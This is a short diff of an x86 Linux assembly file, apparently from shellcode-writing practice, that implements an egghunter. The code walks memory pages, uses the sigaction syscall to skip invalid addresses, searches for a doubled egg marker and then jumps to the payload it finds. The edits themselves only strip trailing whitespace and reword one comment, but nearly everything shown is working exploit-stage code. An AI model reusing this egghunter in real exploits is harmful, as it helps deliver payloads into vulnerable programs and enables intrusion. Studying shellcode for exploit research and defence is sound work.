@@ -8,7 +8,7 @@ global _start
 
 section .text
 _start:
-	cld 		; clear direction flag in preparation for scasd 
+	cld 		; clear direction flag in preparation for scasd
 	xor edx,edx	; clear edx
 	xor ecx,ecx	; clear ecx
 align_page:
@@ -18,7 +18,7 @@ next_address:
     push byte +0x43     ; sigaction(2) value
     pop eax             ; store syscall identifier in eax
     int 0x80            ; call sigaction(2)
-    cmp al,0xf2         ; check if we got an EFAULT(f2) 
+    cmp al,0xf2         ; check if we got an EFAULT(f2)
     jz align_page       ; if so, it's an invalid pointer, loop back and try with next page
     mov eax, 0x373F373F ; if valid page, place the egg in eax
     mov edi, ecx        ; address to be validated, moved into edi
@@ -26,4 +26,4 @@ next_address:
     jnz next_address    ; if no match - try with the next address
     scasd               ; first 4 bytes matched, what about the other half?
     jnz next_address    ; no match - try with the next address
-    jmp edi             ; egg found! jump to our payload
+    jmp edi             ; egg found! pass control to the main shellcode
